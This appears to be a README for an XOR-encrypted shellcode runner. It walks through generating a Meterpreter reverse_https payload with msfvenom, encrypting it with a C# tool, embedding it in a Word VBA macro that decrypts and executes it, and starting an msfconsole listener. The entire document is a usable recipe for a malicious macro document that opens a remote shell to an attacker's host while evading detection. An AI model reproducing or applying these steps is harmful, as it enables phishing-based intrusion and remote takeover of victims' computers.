# XOR Shellcode Runner

## Files

| File | Purpose |
|---|---|
| `xor-shellcode-encryption-3-byte.cs` | C# encryptor — random 3-byte XOR key, outputs VBA array + key |
| `xor-shellcode-runner.vba` | VBA macro — XOR decrypts and executes shellcode at runtime |

## Usage

**1. Generate shellcode:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=<IP> LPORT=443 -f csharp -o shellcode.txt
```

**2. Add your shellcode bytes to `xor-shellcode-encryption-3-byte.cs`:**
```csharp
byte[] buf = new byte[] { 0xfc, 0x48, 0x83, ... };  // ← replace
```

**3. Compile and run the encryptor:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `xor-shellcode-encryption-3-byte.cs`
3. Set configuration to **Release** and platform to **x64** (toolbar dropdowns or Project → Properties → Build)
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Run the exe from `bin\x64\Release\`

**Command line:**
```bash
# Linux
mcs -out:XorEncrypter.exe xor-shellcode-encryption-3-byte.cs
mono XorEncrypter.exe

# Windows
csc /target:exe /platform:x64 /optimize+ /out:XorEncrypter.exe xor-shellcode-encryption-3-byte.cs
XorEncrypter.exe
```

**4. Paste the output into `xor-shellcode-runner.vba`:**
```vb
Warhead = Array(75, 13, 51, ...)   ' ← replace

Dim key(2) As Byte
key(0) = 183   ' ← replace
key(1) = 229
key(2) = 188
```

**5. Insert into Word:**
1. Open Word → `Alt+F11` → Insert → Module
2. Paste the full contents of `xor-shellcode-runner.vba`
3. Save as `.doc` or `.docm`

**6. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```
